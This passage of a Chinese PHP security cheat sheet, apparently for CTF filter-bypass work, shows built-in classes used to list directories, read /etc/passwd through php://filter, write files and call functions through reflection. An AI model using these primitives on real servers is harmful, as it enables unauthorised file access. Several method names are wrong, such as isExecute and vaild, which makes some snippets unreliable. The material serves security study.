其实这个类实际上也就是 `DirectoryIterator` 类的升级版，基本继承了 `DirectorIterator` 类的所有方法，所以利用方式和 `DirectorIterator` 一样:

### poc
```php
# 简单列目录
$dir = "./geek";
$d = new FilesystemIterator($dir);
while ($d->valid()){
    echo $d."\n";
    $d->next();
}

# 也可以用来获取文件的信息
$dir = "./geek";
$d = new DirectoryIterator($dir);
while($d->valid()){
    
    # 获取最后访问时间
    var_dump($d->getATime());
    # 获取创建时间
    var_dump($d->getCTime());
    # 获取最后修改时间
    var_dump($d->getMtime());
    # 获取文件名，
    # 直接用 __toString 也可以
    var_dump($d->getFilename());
    var_dump((string)$d);
    # 获取文件名 (自动除去后缀名)，
    # 比如除去 .php 后缀名
    var_dump($d->getBasename("php"));
    # 获取目录和文件名
    var_dump($d->getPathname());
    # 获取文件所有者
    var_dump($d->getOwner());
    # 获取文件所有组
    var_dump($d->getGroup());
    # 获取文件inode编号
    var_dump($d->getInode());
    # 获取文件权限
    var_dump(substr(sprintf("%o",$d->getPerms()),-4));
    # 获取文件大小
    var_dump(($d->getSize()/1024)." kb");
    # 获取文件类型 (file/dir)
    var_dump($d->getType());
    # 判断文件是否是目录
    var_dump($d->isDir());
    # 判断文件是否是文件 (不是目录)
    var_dump($d->isFile());
    # 判断文件是否为 ./..
    var_dump($d->isDot());
    # 判断文件是否可执行
    var_dump($d->isExecute());
    # 判断文件是否是链接文件
    var_dump($d->isLink());
    # 判断文件是否可读
    var_dump($d->isReadable());
    # 判断文件是否可写
    var_dump($d->isWriteable());
    
    $d->next();
}

# 一些其他方法的功能
# 获取当前目录路径 (其实也就是 ? )
var_dump($d->path());
# 获取当前元素的索引
var_dump($d->key());
# 将当前索引移动到下一个元素
$d->next();
# 将索引重置到开头
$d->rewind();
# 设置索引
$d->seek(0);
# 判断当前索引的文件是否合法 (是否是一个文件)
$d->vaild();
```

## GlobIterator
利用版本：`(PHP 5 >= 5.3.0, PHP 7)`

### 列目录poc
```php
foreach(new GlobIterator("./*") as $f){
    echo $f."\n";
}
```

## DOMDocument
利用版本：`(PHP 5, PHP 7)`

这个类本意是处理 `XML` 和 `HTML` 内容，不过也有相应的读/写文件的方法，只要利用 `伪协议` 稍做加工就可以无杂质地对数据进行操作

### 读文件poc
```php
# 读文件
# 先用 convert.base64 将文件内容base64，避免出现额外的 <p> 标签
# 然后将读取的内容转换成 XML 格式，再加载它，最后取 <p> 标签内的内容 (如果想获取纯净流则可以再进行base64解码)
$f="/etc/passwd";
$d=new DOMDocument();
$d->loadHTMLFile("php://filter/convert.base64-encode/resource=$f");
$d->loadXML($d->saveXML());
echo $d->getElementsByTagName("p")[0]->textContent;
```

### 写文件poc
```php
# 写文件
# 先用 string.strip_tags 将多余的 HTML 标签去掉，然后再用 convert.base64 将多余的其他杂质 (如空格，双引号等非base64字符去掉)
$f="./test.php";
$d=new DOMDocument();
$d->loadHTML("dGVzdA==");
$d->saveHtmlFile("php://filter/string.strip_tags|convert.base64-decode/resource=$f");
```

## finfo
利用版本: `(PHP >= 5.3.0, PECL fileinfo >= 0.1.0)`

### 判断文件是否存在(判断文件类型)poc
```php
$f = "./aasd.php";
$ff = new finfo(FILEINFO_MIME);
echo $ff->file($f);
```


## SplFileObject
  
SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。所以我们也可以利用这个类中的方法代替普通函数来读写文件。

### 读文件poc
```php
$context = new SplFileObject('/etc/passwd');
foreach($context as $f){
    echo($f);
}
// 或者用伪协议base64直接输出，有时候有奇效
$context = new SplFileObject('php://filter/read=convert.base64-encode/resource=/etc/passwd');
echo $context;
```

### 写文件poc
```php
$f = new SplFileObject('./file', "w");
$f->fwrite("file");
```

## IntlChar
利用版本：`(PHP 7, PHP 8, Intl extension)`

### poc
可以取代`ord`，`chr`等函数
```php
# ord 和 chr 函数
IntlChar::ord("a");
IntlChar::chr(97);
```

## ReflectionFunction
利用版本：`(PHP 5, PHP 7)`

### poc
可以通过这个反射类拿到许多函数中的信息
```php

# 反射调用函数
(new ReflectionFunction("func?"))->invoke(args);
(new ReflectionFunction("func?"))->invokeArgs([args1,args2]);

# 获取函数信息
(new ReflectionFunction("func?"))->isDisabled() // 函数是否可用
(new ReflectionFunction("func?"))->getClosure() // 获取该匿名函数
(new ReflectionFunction("func?"))->getDocComment() // 获取函数注释内容
(new ReflectionFunction("func?"))->getStartLine() // 获取函数开始行号
(new ReflectionFunction("func?"))->getEndLine() // 获取函数结束行号
(new ReflectionFunction("func?"))->getExtensionName() // 获取扩展名称
(new ReflectionFunction("func?"))->getName() // 获取函数名称
(new ReflectionFunction("func?"))->getNamespaceName() // 获取命名空间名称
(new ReflectionFunction("func?"))->getNumberOfParameters() // 获取函数参数数量
(new ReflectionFunction("func?"))->getNumberOfRequiredParameters() // 获取函数必须传入的参数数量
(new ReflectionFunction("func?"))->getParameters() // 获取函数参数名
(new ReflectionFunction("func?"))->getShortName() // 获取函数短名
(new ReflectionFunction("func?"))->getStaticVariables() // 获取函数静态变量
(new ReflectionFunction("func?"))->hasReturnType() // 函数是否有特定返回类型
(new ReflectionFunction("func?"))->inNamespace() // 函数是否定义在命名空间
(new ReflectionFunction("func?"))->isClosure() // 函数是否是匿名函数
(new ReflectionFunction("func?"))->isDeprecated() // 函数是否弃用
(new ReflectionFunction("func?"))->isGenerator() // 函数是否是生成器函数
(new ReflectionFunction("func?"))->isInternal() // 函数是否是内部函数
(new ReflectionFunction("func?"))->isUserDefined() // 函数是否是用户定义
```

## ReflectionMethod
利用版本：`(PHP 5, PHP 7)`

### poc
利用功能：
- 设置类中私有/受保护是否可以直接访问
- 通过反射调用方法
- 获取方法信息
```php
# 反射调用方法
(new ReflectionMethod("class?","method?"))->invoke(new [class?]/NULL(静态类),args1,args2);
(new ReflectionMethod("class?","method?"))->invokeArgs(new [class?]/NULL(静态类,[args1,args2]));

# 设置私有/受保护方法
$f = new ReflectionMethod("class?","method?");
$f->setAccessible(true);
$f->invoke(new [class?]);
(new [class?])->[method?](); // 会报错

# 获取函数信息
(new ReflectionMethod("class?","method?"))->getDeclaringClass() // 获取反射方法的类作为反射类返回
(new ReflectionMethod("class?","method?"))->isAbstract() // 方法是否是抽象方法
(new ReflectionMethod("class?","method?"))->isConstructor() // 方法是否是 __construct
(new ReflectionMethod("class?","method?"))->isDestructor() // 方法是否是 __destruct
(new ReflectionMethod("class?","method?"))->isFinal() // 方法是否定义了final
(new ReflectionMethod("class?","method?"))->isPrivate() // 方法是否是私有方法
(new ReflectionMethod("class?","method?"))->isProtected() // 方法是否是受保护方法
(new ReflectionMethod("class?","method?"))->isPublic() // 方法是否是公有方法
(new ReflectionMethod("class?","method?"))->isStatic() // 方法是否是静态方法
(new ReflectionMethod("class?","method?"))->getDocComment() // 获取方法注释内容
(new ReflectionMethod("class?","method?"))->getStartLine() // 获取方法开始行号
(new ReflectionMethod("class?","method?"))->getEndLine() // 获取方法结束行号
(new ReflectionMethod("class?","method?"))->getExtensionName() // 获取扩展名称
(new ReflectionMethod("class?","method?"))->getName() // 获取方法名称
(new ReflectionMethod("class?","method?"))->getNamespaceName() // 获取命名空间名称
(new ReflectionMethod("class?","method?"))->getNumberOfParameters() // 获取方法参数数量
(new ReflectionMethod("class?","method?"))->getNumberOfRequiredParameters() // 获取方法必须传入的参数数量
(new ReflectionMethod("class?","method?"))->getParameters() // 获取方法参数名
(new ReflectionMethod("class?","method?"))->getShortName() // 获取方法短名
(new ReflectionMethod("class?","method?"))->getStaticVariables() // 获取方法静态变量
(new ReflectionMethod("class?","method?"))->hasReturnType() // 方法是否有特定返回类型
(new ReflectionMethod("class?","method?"))->inNamespace() // 方法是否定义在命名空间
(new ReflectionMethod("class?","method?"))->isClosure() // 方法是否是匿名函数
(new ReflectionMethod("class?","method?"))->isDeprecated() // 方法是否弃用
(new ReflectionMethod("class?","method?"))->isGenerator() // 方法是否是生成器函数
(new ReflectionMethod("class?","method?"))->isInternal() // 方法是否是内部函数
(new ReflectionMethod("class?","method?"))->isUserDefined() // 方法是否是用户定义
```

## ReflectionClass
利用版本：`(PHP 5, PHP 7)`

### poc
利用功能：
- 获取/修改类中静态属性的值
- 获取类中属性的值
- 实例化新类
- 获取类信息

```php
# 获取/修改类中静态属性的值
(new ReflectionClass("class?"))->getStaticProperties(); # 获取静态属性
(new ReflectionClass("class?"))->getStaticPropertyValue("key?","default_value?"); # 获取指定静态属性的值，可以手动设置默认值
(new ReflectionClass("class?"))->setStaticPropertyValue("key?","value?"); # 设置静态属性的值

# 获取类中属性的值
(new ReflectionClass("class?"))->getProperties(); # 获取属性
(new ReflectionClass("class?"))->getProperty("key?") # 获取指定属性的值

# 实例化新类，
# 比如反射 phpinfo 函数
$c = new ReflectionClass('ReflectionFunction');
$iv = $c->newInstance('phpinfo');
$ia = $c->newInstanceArgs(array('phpinfo'));
$ie = $c->newInstanceWithoutConstructor(); // 调用一个类但不调用其 __construct 方法

# 获取类信息
(new ReflectionClass("class?"))->export(); // 导出类
(new ReflectionClass("class?"))->getConstant(string $name) // 获取类中指定常量值
(new ReflectionClass("class?"))->getConstants(?int $filter = null) // 获取类中所有常量值
(new ReflectionClass("class?"))->getConstructor() // 获取类中构造方法(__construct)作为反射方法返回
(new ReflectionClass("class?"))->getDefaultProperties() // 获取类中默认属性
(new ReflectionClass("class?"))->getDocComment() // 获取类的注释
(new ReflectionClass("class?"))->getStartLine() // 获取类开始行号
(new ReflectionClass("class?"))->getEndLine() // 获取类结束行号
(new ReflectionClass("class?"))->getExtensionName() // 获取类的扩展名称
(new ReflectionClass("class?"))->getFileName() // 获取类所在的文件名
(new ReflectionClass("class?"))->getInterfaceNames() // 获取类的接口名称
(new ReflectionClass("class?"))->getInterfaces() // 获取类的接口
(new ReflectionClass("class?"))->getMethod(string $name) // 获取类的指定方法作为反射方法返回
(new ReflectionClass("class?"))->getMethods() // 获取类的方法
(new ReflectionClass("class?"))->getModifiers() // 获取类的修饰符
(new ReflectionClass("class?"))->getName() // 获取类名称
(new ReflectionClass("class?"))->getNamespaceName() // 获取类所在命名空间名称
(new ReflectionClass("class?"))->getParentClass() // 获取父类作为反射类返回
(new ReflectionClass("class?"))->getReflectionConstant() // 获取类的指定常量作为反射类常量返回
(new ReflectionClass("class?"))->getReflectionConstants() // 获取类的常量作为反射类常量数组返回
(new ReflectionClass("class?"))->getShortName() // 获取类的短名
(new ReflectionClass("class?"))->getTraitAliases() // 获取类所使用 trait 别名的数组
(new ReflectionClass("class?"))->getTraitNames() // 获取类所使用 traits 名称的数组
(new ReflectionClass("class?"))->getTraits() // 获取类所使用的 traits 
(new ReflectionClass("class?"))->hasConstant(string $name) // 类是否有指定的常量
(new ReflectionClass("class?"))->hasMethod(string $name) // 类是否有指定的方法
(new ReflectionClass("class?"))->implementsInterface(string $interface) // 类是否实现指定的接口
(new ReflectionClass("class?"))->inNamespace() // 类是否在命名空间中
(new ReflectionClass("class?"))->isAbstract() // 类是否是抽象类
(new ReflectionClass("class?"))->isAnonymous() // 类是否是匿名类
(new ReflectionClass("class?"))->isCloneable() // 类是否是可复制的
(new ReflectionClass("class?"))->isFinal() // 类是否声明为 final
(new ReflectionClass("class?"))->isInternal() // 类是否是内部的
(new ReflectionClass("class?"))->isIterable() // 类是否是一个迭代类
(new ReflectionClass("class?"))->isIterateable() // 类是否是可迭代的
(new ReflectionClass("class?"))->isSubclassOf(string $class) // 类是否是指定类的子类
(new ReflectionClass("class?"))->isTrait() // 类是否是 trait
(new ReflectionClass("class?"))->isUserDefined() // 类是否是用户定义的
```

